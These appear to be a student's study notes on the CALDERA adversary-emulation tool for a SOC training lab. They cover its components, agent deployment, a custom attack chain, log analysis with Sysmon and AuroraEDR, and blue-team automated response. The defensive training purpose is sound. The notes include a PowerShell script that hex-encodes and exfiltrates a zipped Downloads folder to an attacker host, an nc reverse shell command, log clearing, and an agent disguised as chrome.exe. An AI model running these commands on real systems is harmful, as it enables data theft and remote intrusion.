# CALDERA Notes 

## What is CALDERA?

CALDERA is a tool that behaves like a fake hacker.

It runs real attack techniques on your system to check:

* Can your security tools detect attacks?
* Can your SOC team respond properly?

👉 Simple meaning:
CALDERA = "Practice tool to test security"

---

## Why SOC uses CALDERA?

SOC analysts use CALDERA to:

* Test detection (SIEM alerts working or not)
* Simulate real attacks
* Train themselves for real incidents
* Find security gaps

---

## Main Components (Easy Explanation)

### 1. Agent

Agent is a small program installed on a system.

It acts like a "controlled infected machine".

What it does:

* Connects to CALDERA server
* Runs attack commands

👉 SOC view:
Agent = fake compromised system

---

### 2. Ability

Ability = one attack step

Examples:

* Run PowerShell command
* Dump credentials
* Download file

👉 SOC view:
These are real attacker actions

---

### 3. Adversary

Adversary = group of abilities

It represents a full attacker behavior

Example:

* Ransomware attacker
* APT attacker

👉 SOC view:
Full attack scenario

---

### 4. Operation

Operation = running the attack

Formula:
Operation = Adversary + Agents

👉 SOC view:
This is when actual simulation happens

---

### 5. Planner

Planner controls how attack runs

Types:

* Atomic → step by step
* Batch → all at once
* Buckets → grouped by attack stages

👉 SOC use:
Test different attack styles

---

### 6. Facts

Facts = information about system

Examples:

* Username
* IP address
* OS type

👉 SOC view:
Same as attacker reconnaissance

---

### 7. Obfuscator

Obfuscator hides commands

Example:

* Encode PowerShell

👉 SOC view:
Helps test detection bypass

---

### 8. Jitter

Jitter = delay between actions

* Low jitter → fast attack
* High jitter → slow & stealthy attack

👉 SOC view:
Slow attacks are harder to detect

---

### 9. Plugins

Plugins add extra features

Important ones:

* Sandcat → main agent
* Response → automatic incident response
* Training → learning mode
* Human → fake user activity

---

## Simple Flow (Very Important)

1. Start CALDERA
2. Deploy agent on system
3. Choose adversary (attack type)
4. Run operation
5. Attack is simulated
6. Check logs in SIEM/EDR
7. Improve detection rules

---

## Real SOC Example

* CALDERA runs credential dumping
* SOC checks:

  * Did alert trigger?
  * Was severity correct?
  * Was anything missed?

If missed → improve rules

---

## Final Summary

CALDERA helps SOC teams to:

* Simulate real attacks
* Test detection
* Improve response
* Become ready for real incidents

👉 One line:
CALDERA = Safe way to practice cyber attacks

---
# CALDERA Practical

## Lab Setup

We use 2 machines:

* AttackBox → runs CALDERA (attacker side)
* Windows Machine → victim (target)

---

## Step 1: Start CALDERA

Open terminal in AttackBox and run:

cd Rooms/caldera/caldera
source ../caldera_venv/bin/activate
python server.py --insecure

👉 Wait until you see:
All systems ready

Meaning: CALDERA server is running

---

## Step 2: Open CALDERA Dashboard

Open browser:

http://AttackBox_IP:8888

Login:

* Username: red
* Password: admin

---

## Step 3: Deploy Agent (Very Important)

Go to: Agents tab

* Select agent: Manx (for Windows)
* Change IP address → set AttackBox IP (not 0.0.0.0)
* Rename agent file → chrome.exe (looks realistic)

Copy generated command and run it in victim machine PowerShell

👉 What this command does:

* Downloads agent from CALDERA
* Saves it in system
* Runs it in background

👉 Result:
Agent appears in CALDERA

SOC Meaning:
System is now "simulated compromised"

---

## Step 4: Select Adversary Profile

Go to: Adversaries tab

Choose:
Enumerator Profile

👉 This profile performs:

* Process listing
* System information gathering
* User enumeration

SOC Meaning:
Reconnaissance activity (attacker collecting info)

---

## Step 5: Review Abilities

Click any ability

Check:

* Executor → how command runs (PowerShell, CMD)
* Command → actual command executed

👉 Important for SOC:
Understand what activity will appear in logs

---

## Step 6: Create Operation

Go to: Operations tab → Create Operation

Set:

* Adversary → Enumerator
* Group → red
* Obfuscation → disabled

Click: Start

---

## Step 7: Execution

Agent starts running abilities one by one

Examples:

* List processes
* Get system info
* Check users

SOC Meaning:
Real attack simulation is happening

---

## Step 8: Review Results

For each ability:

* View Command → see executed command
* View Output → see result

👉 Some abilities may fail (normal)

---

## SOC Analysis (Most Important)

After operation:

SOC team should check:

* Did SIEM detect activity?
* Were alerts generated?
* Was severity correct?
* Was anything missed?

If missed:
→ Improve detection rules

---

## Simple Flow

Start CALDERA
→ Deploy Agent
→ Select Adversary
→ Run Operation
→ Review Results
→ Improve Detection

---

## Final Summary

CALDERA helps SOC teams to:

* Simulate real attacks safely
* Test detection systems
* Improve incident response
* Find security gaps

👉 One line:
CALDERA = Practice environment for SOC to test real attacks

---
# CALDERA Custom Attack Chain 
## Objective

Create and run a full attack chain from:
Initial Access → Exfiltration

👉 Goal:
Simulate real attacker behavior and test SOC detection

---

## Attack Chain Overview

| Stage          | What it Means                |
| -------------- | ---------------------------- |
| Initial Access | Enter system (phishing file) |
| Execution      | Run malicious command        |
| Persistence    | Stay in system               |
| Discovery      | Collect system info          |
| Collection     | Gather data                  |
| Exfiltration   | Send data out                |

---

## Step 1: Identify Problems

While reviewing abilities:

* Internet not available → download will fail
* Folder path does not exist → zip will fail
* Exfiltration ability missing

👉 Solution:
Modify existing abilities + create new ability

---

## Step 2: Fix File Download (Initial Access)

Problem:
Command downloads file from internet (GitHub)

Solution:
Host file locally using AttackBox

Run:

python3 -m http.server 8080

Update command:

$url = 'http://ATTACKBOX_IP:8080/PhishingAttachment.xlsm'
Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm

SOC Insight:
Attackers may use local/internal servers instead of internet

---

## Step 3: Fix Data Collection (Zip Ability)

Problem:
Folder path does not exist

Solution:
Use real folder (Downloads)

Updated command:

Compress-Archive -Path $env:USERPROFILE\Downloads -DestinationPath $env:TEMP\exfil.zip -Force

SOC Insight:
Attackers collect user files before exfiltration

---

## Step 4: Create New Ability (Exfiltration)

Name:
Exfiltrating Hex-Encoded Data Chunks over HTTP

---

### What it does:

* Reads zip file
* Converts data to hex
* Splits into small chunks
* Sends via HTTP requests

---

### Command:

$file="$env:TEMP\exfil.zip"
$destination="http://ATTACKBOX_IP:8080/"
$bytes=[System.IO.File]::ReadAllBytes($file)
$hex=($bytes|ForEach-Object ToString X2) -join ''
$split=$hex -split '(\S{20})' -ne ''
ForEach ($line in $split) { curl.exe "$destination$line" }
echo "Done exfiltrating the data."

---

SOC Insight:

* Suspicious HTTP traffic
* Encoded data transfer
* Possible data exfiltration

---

## Step 5: Create Custom Adversary Profile

Profile Name:
Emulation Activity #1

Description:
Full attack chain simulation

---

### Add these abilities:

* Download Macro-Enabled Phishing Attachment
* Create Process using WMI
* Winlogon Persistence
* Identify local users
* Zip data
* Exfiltrate data

---

## Step 6: Run Operation

Go to Operations → Create Operation

Set:

* Adversary → Emulation Activity #1
* Group → red
* Obfuscation → disabled

Click Start

---

## Step 7: Execution Flow

Attack runs step by step:

1. File downloaded (phishing)
2. Command executed
3. Persistence created
4. Users discovered
5. Data zipped
6. Data exfiltrated

---

## Step 8: SOC Analysis (Most Important)

SOC team should check:

* Was phishing detected?
* Was execution logged?
* Was persistence detected?
* Was data exfiltration flagged?

If not detected:
→ Improve detection rules

---

## Final Flow

Modify abilities
→ Create new ability
→ Build adversary profile
→ Run operation
→ Review logs
→ Improve detection

---

## Final Summary

CALDERA allows SOC teams to:

* Simulate full real-world attacks
* Test detection across all stages
* Identify blind spots
* Improve security posture

👉 One line:
CALDERA = End-to-end attack simulation for SOC testing

---
# CALDERA Log & Detection Analysis

## Objective

Analyse logs and detections after running attack simulation.

👉 Goal:
Check if security tools can detect attacker activity

---

## Tools Used

### 1. Sysmon

* Logs system activity
* Example:

  * Process creation
  * Registry changes
  * File activity

👉 SOC Role:
Provides detailed raw logs

---

### 2. AuroraEDR

* Detects suspicious behavior
* Generates alerts using rules (Sigma)

👉 SOC Role:
Provides detection and alerts

---

## Step 1: Run Attack (Controlled Way)

Create operation with:

Run State → Pause on Start

👉 Reason:
Run one ability at a time for easy analysis

---

## Step 2: Execute Abilities One-by-One

Use:

Run 1 Link

👉 Result:

* Only one attack step runs
* Logs are easy to analyse

---

## Step 3: Analyse Sysmon Logs

Open:

Event Viewer
→ Applications and Services
→ Microsoft
→ Windows
→ Sysmon

---

### Key Point

Always find logs with:

ParentImage: C:\Users\Public\chrome.exe

👉 Meaning:
This is the CALDERA agent (attacker process)

---

### What to Look For

* Process creation (Event ID 1)
* Registry changes (Event ID 13)
* Command line execution

👉 SOC Insight:
Track attacker actions step by step

---

## Step 4: Analyse Logs using PowerShell

View logs:

Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | fl

---

### Important Tips

* Use `fl` → detailed output
* Read logs from bottom to top → correct timeline
* Ignore unrelated logs

---

### Clear Logs Before Next Step

Clear-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"

👉 Reason:
Avoid confusion from old logs

---

## Step 5: Real-Time Monitoring (Optional)

Run:

PowerSiem.ps1

👉 Function:

* Shows logs every second
* Easier to track live activity

---

## Step 6: Analyse AuroraEDR Alerts

Open:

Event Viewer
→ Windows Logs
→ Application

---

### Apply Filter

Source = AuroraAgent

👉 Shows only security alerts

---

### What to Check

* Alert details
* Process name
* Command line
* Detection reason

---

### Important Field

Match_Strings

👉 Shows:
Why alert was triggered

Example:

* powershell.exe detected
* -ExecutionPolicy bypass detected

---

## Step 7: SOC Workflow

For each ability:

1. Run one ability
2. Check Sysmon logs
3. Check Aurora alerts
4. Understand activity
5. Clear logs
6. Repeat

---

## Key Difference

| Tool      | Purpose                     |
| --------- | --------------------------- |
| Sysmon    | What happened (logs)        |
| AuroraEDR | What is suspicious (alerts) |

---

## Final Flow

Run ability
→ Check logs (Sysmon)
→ Check alerts (EDR)
→ Analyse behavior
→ Improve detection

---

## Final Summary

This process helps SOC teams to:

* Understand attacker behavior
* Analyse logs step-by-step
* Validate detection rules
* Improve security monitoring

👉 One line:
SOC uses logs + alerts to detect and understand attacks

---
# CALDERA Blue Team (Response Plugin) 

## Objective

Use CALDERA as a blue teamer to:

* Detect attacks
* Hunt threats
* Automatically respond

👉 Goal:
Simulate automated incident response

---

## Blue Login

Login with:

Username: blue
Password: admin

👉 Interface changes:

* Theme becomes blue
* Adversaries tab → Defenders tab

---

## Response Plugin

Response Plugin = Blue team module in CALDERA

👉 Functions:

* Detect suspicious activity
* Hunt threats
* Perform automated response

---

## Ability Types (Blue Side)

| Type     | Purpose                         |
| -------- | ------------------------------- |
| Setup    | Prepare data (baseline)         |
| Detect   | Find suspicious behavior        |
| Hunt     | Search for threats (IOC-based)  |
| Response | Take action (kill/block/delete) |

---

## Defender Profiles

Defenders = Blue team equivalent of adversaries

Available profiles:

* Incident Responder ✅ (important)
* Elastic Hunter
* Query Sysmon
* Task Hunter

---

## Incident Responder Profile

👉 Contains:

* Detection abilities
* Hunting abilities
* Response abilities

👉 Purpose:
End-to-end automated SOC workflow

---

## Ability Relationships (Important)

Some abilities depend on others

Example:

Detect Ability:
Find unauthorized processes

↓ gives data (fact)

Response Ability:
Enable firewall rule / kill process

👉 Meaning:
Response runs only after detection

---

## Facts and Sources

### Fact

A piece of data used by abilities

Example:
remote.port.unauthorized = 4444

---

### Source

Group of facts

Default:
response source

---

### Example Fact Values

remote.port.unauthorized:

* 7010
* 7011
* 7012
* 4444

👉 Ability runs multiple times (for each port)

---

## Incident Simulation

### Step 1: Start Listener (AttackBox)

nc -lvp 4444

---

### Step 2: Reverse Shell (Victim)

.\nc.exe ATTACKBOX_IP 4444 -e cmd.exe

👉 Result:
Attacker gains access to victim

SOC Meaning:
System is compromised

---

## Step 3: Deploy Blue Agent

Go to Agents → Deploy Agent

* Agent: Sandcat
* Set IP = AttackBox IP
* Run command in victim machine

👉 Agent group:
blue

---

## Step 4: Create Blue Operation

Go to Operations → Create Operation

Set:

* Defender → Incident Responder
* Fact Source → response
* Group → blue
* Planner → batch

---

## Step 5: Run Operation

Click Start

---

## Execution Flow

System performs:

### 1. Detect

* Finds suspicious processes
* Detects unauthorized ports

---

### 2. Hunt

* Searches logs
* Finds malicious indicators

---

### 3. Response

* Kills malicious process
* Blocks connection (firewall)
* Deletes suspicious files

---

## SOC Workflow

Attack happens
→ Detection triggered
→ Data collected
→ Response action executed

---

## Key Concept

Detection → provides data
Response → uses that data

👉 Without detection, response cannot work

---

## Final Summary

CALDERA Blue Team helps SOC to:

* Automate detection and response
* Reduce manual work
* Improve incident handling speed
* Simulate real SOC automation

---

## One Line

CALDERA Blue = Automated SOC system for detecting and stopping attacks

---
